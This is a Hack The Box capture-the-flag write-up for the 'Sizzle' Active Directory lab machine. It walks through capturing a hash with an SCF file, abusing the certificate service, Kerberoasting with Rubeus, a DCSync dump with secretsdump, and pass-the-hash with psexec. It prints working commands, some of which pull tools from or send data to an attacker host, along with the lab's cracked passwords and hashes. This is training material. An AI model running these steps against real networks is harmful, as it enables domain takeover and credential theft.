---
title: "Hack The Box - Sizzle"
tags: [windows,insane,scf,openssl,kerberoasting,rubeus,dcsync,secretsdump]
categories: HackTheBox-Active-Directory
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled.png)

⇒ Sizzle is an Insane Active Directory machine that teaches us :

- SCF Attack to steal user hash
- Creating a certificate using openssl and getting it signed by Active Directory Certificate Services
- Kerberoasting using Rubeus
- Using secretsdump to perform DCSync attack.

---

## NMAP

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%201.png)

---

## Enumerating and Performing SCF Attack

⇒ Enumerating the website we find /certsrv which has an login but we dont have any credentials :
[http://10.10.10.103/certsrv](http://10.10.10.103/certsrv)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%202.png)

⇒ We find an interesting smb share named "Development Shares" which we can write files to the Users/Public folder : 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%203.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%204.png)

### SCF Attack

⇒ It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. 

- Creating SCF file :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%205.png)

- Starting up responder

**responder -I tun0 -v**
- Uploaded it to Users\Public in Development Shares

⇒ Then after waiting for a while it is triggered by user amanda and we have her hash. Which we cracked using john.

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%206.png)

**amanda : Ashare1972**

We are able to login on /certsrv as user amanda

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%207.png)

---

### Creating certificate then getting it signed then evil-winrm

⇒ So to connect to the machine using evil-winrm we need a certificate that is signed. So we will be creating a certificate using openssl then getting it signed through the website 

- Creating certificate

```
openssl genrsa -aes256 -out enox.key 2048
openssl req -new -key enox.key -out enox.csr
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%208.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%209.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2010.png)

- Now we have to upload it on the website to sign it so we can use it for authentication with evil-winrm :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2011.png)

⇒ Login with evil-winrm using the certificate and amanda credentials

**evil-winrm -S -k enox.key -c enox.cer -i 10.10.10.103 -p Ashare1972 -u amanda**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2012.png)

---

## Privilege Escalation [ Kerberoasting and DCSync Attack ]

⇒ We will be downloading and running sharphound.exe in **`C:\Windows\System32\spool\drivers\color`**

- Uploading sharphound.exe to the machine :

**IWR -Uri http://10.10.14.8/SharpHound.exe -Outfile Sharphound.exe**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2013.png)

- Running it then downloading the zip file :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2014.png)

- We will be using smbserver to transfer the file to our system

```
smbserver.py enox . -smb2support -username enox -password enox

net use x: \\10.10.14.19\enox /user:enox enox
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2015.png)

`copy 20200730104621_BloodHound.zip x:\`

⇒ Next we opened it up in bloodhound and saw that user mrkly can perform dcsync attack and has an SPN set. So we will first kerberoast user mrkly then perform dcsync attack using secretsdump

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2016.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2017.png)

---

### Kerberoasting mrkly using Rubeus

⇒ So we will be using a tool named Rubeus to kerberoast the user mrkly that has http/sizzle spn set

- Authorizing as user amanda and requesting tgt

```
.\r.exe hash /password:Ashare1972

.\r.exe asktgt /user:amanda /rc4:7D0516EA4B6ED084F3FDF71C47D9BEB3 /outfile:ticket
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2018.png)

- Next we'll request TGS ( Ticket Granting Service ) for the service http/sizzle :

**.\r.exe asktgs /service:http/sizzle /ticket:ticket**
- Finally kerberoasting

**.\r.exe kerberoast /spn:http/sizzle /ticket:ticket /nowrap**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2019.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2019.png)

**mrkly : Football#7**

---

### DCSync Attack

⇒ We will now perform dcsync attack using secretsdump as user mrkly as this user has GetChanges privileges :

`secretsdump.py HTB.local/mrlky:'Football#7'@10.10.10.103`

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2020.png)

⇒ We have got now the administrator NTLM hash which we can use with psexec.py to get a shell on the system as administrator

`psexec.py -hashes a:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103`

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2021.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Sizzle%20Box%20820989b0557d46f4bd5054fb500ba254/Untitled%2021.png)
